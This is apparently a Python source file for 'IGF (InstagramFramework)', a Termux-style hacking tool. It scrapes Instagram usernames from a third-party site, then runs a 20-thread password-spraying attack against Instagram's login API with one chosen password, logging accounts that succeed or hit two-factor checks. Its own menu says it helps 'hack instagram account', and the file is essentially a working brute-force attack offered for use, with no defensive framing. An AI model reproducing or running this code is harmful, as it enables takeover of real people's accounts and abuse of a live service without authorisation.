import requests, json, re, time
from http.cookiejar import LWPCookieJar as cj
from bs4 import BeautifulSoup as bs
import threading
m0 = '\x1b[0;0m'
m1 = '\x1b[1m'
m90 = '\x1b[1;90m'
m91 = '\x1b[91m'
m92 = '\x1b[92m'
m93 = '\x1b[93m'
m94 = '\x1b[94m'
m95 = '\x1b[95m'
m96 = '\x1b[96m'
m97 = '\x1b[1;97;41m'
m31 = '\x1b[0;31m'
m36 = '\x1b[0;36m'

def logo():
    import os
    os.system('clear')
    print(f"\n\n{m1}{m96}\n ┬┌─┐  ┌─┐┬─┐┌─┐┌┬┐┬─┐┬ ┬┌─┐┬─┐┬┌─\n ││ ┬  ├┤ ├┬┘├─┤│││├┤ ││││ │├┬┘├┴┐\n ┴└─┘  ┴  ┴└─┴ ┴┴ ┴└─┘└┴┘└─┘┴└─┴ ┴\n {m97} Youtube Channel: Njank Soekamti {m0}\n\t")
    time.sleep(0.5)


def gas():
    try:
        try:
            logo()
            print(m96 + ' Input password of this tool')
            print(m91 + ' ---------------------------')
            print(m90 + ' See Password on my Youtube\n')
            inp = ['n74nk420']
            pwd = input(f" {m95}n74nk{m90}?> {m0}")
            while 1:
                if pwd not in inp:
                    logo()
                    print(m96 + ' Input password of this tool')
                    print(m91 + ' ---------------------------')
                    print(m90 + ' See Password on my Youtube\n')
                    print(f"{m31} Wrong password, try again")
                    pwd = input(f" {m95}n74nk{m90}?> {m0}")

            if pwd == 'n74nk420':
                menu()
        except KeyboardInterrupt:
            logo()

    finally:
        print(f" {m96}Exiting program\n {m91}---------------\n {m90}Thanks for using this tool\n Subscribe my Channel Youtube\n")


def search():
    logo()
    print(m96 + ' Dump random username')
    print(m91 + ' --------------------')
    name = input(f" {m0}Name : ")
    while 1:
        if len(name) == 0:
            print(f" {m91}Don't be empty")
            name = input(f" {m0}Name : ")

    nm = name.replace(' ', '+')
    cek = requests.get('http://gopicta.com/?s=' + nm)
    b = bs(cek.text, 'html.parser')
    id = open(name.replace(' ', '_') + '.txt', 'w')
    for us in b.find_all('li'):
        id.write(us.find('a').get('href').split('/')[3] + '\n')

    logo()
    print(m96 + ' Dump random username')
    print(m91 + ' --------------------')
    print(m0 + ' Username saved ' + name + '.txt\n')
    input(f" {m95}Enter to exit{m90}?> {m0}")
    logo()
    exit()


def folower():
    url = 'http://gopicta.com/'
    print(m96 + ' Dump username by follower')
    print(m91 + ' -------------------------')
    usr = input(f" {m0}Username (without @) : ")
    us = usr.replace(' ', '+')
    r = requests.get(url + us).text
    b = bs(r, 'html.parser')
    id = open(usr.replace(' ', '_') + '.txt', 'w')
    for us in b.find_all('li'):
        if 'class' in str(us):
            continue
        print(us)
        id.write(us.find('a').get('href').split('/')[3] + '\n')

    logo()
    print(m96 + ' Dump username by follower')
    print(m91 + ' -------------------------')
    print(m0 + ' Username saved ' + usr + '.txt\n')
    input(f" {m95}Enter to exit{m90}?> {m0}")
    logo()
    exit()


def crack():
    global pw
    id = []
    print(m96 + ' Milti brute force')
    print(m91 + ' -----------------')
    list = open(input(f" {m0}Path of list : {m90}"), 'r').readlines()
    print(f" {m96}{str(len(list))}{m0} username found")
    pw = input(f" Password : {m90}")
    print(f"\n {m96}Cracking start")
    print(f" {m91}--------------")
    for i in list:
        id.append(i.strip())

    from multiprocessing.pool import ThreadPool as tp
    try:
        t = tp(20)
        p = t.map(logcrack, id)
    except requests.exceptions.ConnectionError:
        print(m91 + ' Connection error')
    except json.decoder.JSONDecodeError:
        print(m91 + '\n Program stoped ...\n Connection too slow')

    if len(succ) == 0:
        pass
    if len(tf) == 0:
        print(f"{m0}\n Cracking {m96}{str(len(id))}{m0} username done with no results\n")
        input(f" {m95}Enter to return{m90}?> {m0}")
        crack()
    else:
        print(f" {m96}Results\n {m96}-------\n\t")
        if len(succ) == 0:
            print(f" {m96}Two factor verification(s):")
            for i in tf:
                print(m95 + '  * ' + m0 + i)

        elif len(tf) == 0:
            print(f" {m96}Success:")
            for i in succ:
                print(m95 + '  * ' + m0 + i)

        else:
            print(f" {m96}Success:")
            for i in succ:
                print(m95 + '  * ' + m0 + i)

            print(f" {m96}Two factor verification(s):")
            for i in tf:
                print(m97 + '  * ' + m0 + i)


def logcrack(uname):
    ig = 'https://www.instagram.com'
    log_ig = ig + '/accounts/login/ajax/'
    headers = {'User-Agent': 'Mozilla/5.0 (Linux; Android 7.1.2; Redmi Note 5A Build/N2G47H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Mobile Safari/537.36'}
    s = requests.Session()
    s.cookies = cj('kuki')
    s.headers = headers
    s.headers.update({'Referer': ig})
    r = s.get(ig)
    s.headers.update({'X-CSRFToken': r.cookies['csrftoken']})
    data = {'username':uname,  'password':pw}
    login = s.post(log_ig, data=data, allow_redirects=True)
    s.headers.update({'X-CSRFToken': login.cookies['csrftoken']})
    j = json.loads(login.text)
    if 'fr' in j:
        print(m92 + ' Success ' + m96 + uname)
        succ.append(uname)
    elif 'two_factor_required' in j:
        print(m96 + ' ' + uname + m94 + ' Two factor Authentification')
        tf.append(uname)
    else:
        print(m91 + ' Failed ' + m96 + uname + m0)


succ = []
tf = []

def menu():
    logo()
    print(f" {m0}[{m96}1{m0}]  {m36}Multi brute force instagram{m0}\n [{m96}2{m0}]  {m36}Dump username by follower{m0}\n [{m96}3{m0}]  {m36}Dump username by random{m0}\n [{m96}4{m0}]  {m36}About this tool{m0}\n [{m91}0{m0}]  {m36}Exit\n\t")
    inp = ['1', '2', '3', '4', '0']
    c = input(f" {m95}n74nk{m90}?> {m0}")
    while c not in inp:
        logo()
        print(f" {m0}[{m96}1{m0}]  {m36}Multi brute force instagram{m0}\n [{m96}2{m0}]  {m36}Dump username by follower{m0}\n [{m96}3{m0}]  {m36}Dump username by random{m0}\n [{m96}4{m0}]  {m36}About this tool{m0}\n [{m91}0{m0}]  {m36}Exit\n ")
        print(f"{m91} Wrong input, try again")
        c = input(f" {m95}n74nk{m90}?> {m0}")

    if c == '3':
        logo()
        search()
    elif c == '0':
        logo()
        exit()
    elif c == '2':
        logo()
        folower()
    elif c == '1':
        logo()
        crack()
    elif c == '4':
        logo()
        print(m96 + ' About this tool')
        print(m91 + ' ---------------')
        print(f"{m0}{m1} This tool can help you to hack instagram account{m90}\n Name   :  IGF (InstagramFramework)\n Author :  Njank Soekamti\n Team   :  TERMUXID3 (https://biy.ly/TERMUXID3)\n")
        input(f" {m95}Enter to return{m90}?> {m0}")
        menu()


if __name__ == '__main__':
    gas()
